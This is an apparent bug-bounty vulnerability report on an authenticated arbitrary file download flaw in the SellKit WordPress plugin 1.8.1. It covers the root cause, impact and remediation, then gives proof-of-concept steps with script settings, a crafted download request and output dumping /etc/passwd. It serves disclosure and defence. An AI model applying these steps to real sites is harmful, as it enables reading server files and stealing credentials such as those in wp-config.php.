# Post Report Info

- Link: https://patchstack.com/database/vulnerability/sellkit/wordpress-sellkit-plugin-1-8-1-arbitrary-file-download-vulnerability
- CVE: 2024-30509
- Bounty: 11.25 AXP

# SellKit Arbitrary File Download

The SellKit WordPress Plugin is vulnerable to subscriber level authenticated arbitrary file download. It would work unauthenticated but a typo in the code prevents it from functioning.

## Affected Plugin

Title: SellKit – Funnel builder and checkout optimizer for WooCommerce to sell more, faster
Active installations: 10k
Version: 1.8.1
Slug: sellkit
Link: https://wordpress.org/plugins/sellkit/
CVSS 6.5 https://nvd.nist.gov/vuln-metrics/cvss/v3-calculator?vector=AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N&version=3.1

## Root Cause

There is some code in the `download-redirect.php` that is designed to restrict downloads to only those in the upload dir, but it does not work. 

```php
// Restrict the download to WP upload directory.
if ( strpos( $file, $upload_dir['basedir'] ) > 0 ) {
    wp_die( '<script>window.close();</script>' );
}
```

## Impact

Arbitrary files can be downloaded from the server totally compromising it's confidentiality and potentially enabling further attacks through leaking of access credentials such as those stored in `wp-config.php`

## Remediation

- Restrict file downloads to the uploads dir
- Consider restricting download types to an allowed set of types
- There is likely functionality in WordPress core that could be used to do this rather than writing your own
- 
## Proof of Concept

1. Install the WooCommerce, Elementor and SellKit plugins
2. Create a post with a basic sell kit opt-in form (simple form with name/email)
3. Create an onsubmit action that downloads a file on completion
4. Modify the 4 variables in the PoC script `sellkit.py` and run it. The user/pass are of a subscriber level user and the post is the link to the post you created above with the form in.

```python
USER = 'user'
PASSWORD = 'password'
TARGET = 'http://localhost:8080'
POST = 'elementor-283'
```

5. The script will find the post_id, form_id and nonce from that page and use these values to gain access to a different nonce which can then be used to download arbitrary files:

```
❯ python3 sellkit.py
[+] Login Successful
[+] Post ID: 283
[+] Form ID: cf9b07b
[+] Nonce: f054ed768d
[+] Download URL: http://localhost:8080/wp-admin/admin-post.php?action=sellkit_download_file&file=L3Zhci93d3cvaHRtbC93cC1jb250ZW50L3VwbG9hZHMvMjAyNC8wMS90ZXN0X182NWIyZGFmZWI2ZGYyLmpwZw=&_wpnonce=a1badc8e8e
[+] Download Nonce: a1badc8e8e
handle download file...root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
_apt:x:42:65534::/nonexistent:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
```